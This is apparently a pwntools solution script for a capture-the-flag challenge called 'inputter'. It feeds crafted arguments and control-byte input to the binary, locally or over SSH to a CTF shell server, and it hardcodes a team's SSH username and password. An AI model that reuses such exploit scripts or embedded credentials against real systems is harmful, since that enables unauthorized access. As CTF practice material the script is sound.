from pwn import *
import sys

arg = ["./inputter", " \n'\"\x07"] 
if len(sys.argv) == 1:
    r = process(arg)
else:
    shell = ssh(host="shell.actf.co", user="team5764", password="2f126c26e79301d78fa0")
    shell.sendline("cd /problems/2020/inputter/")

    r = shell.process(arg, cwd="/problems/2020/inputter")

buf = "\x00\x01\x02\x03\n"
r.sendline(buf)

r.interactive()

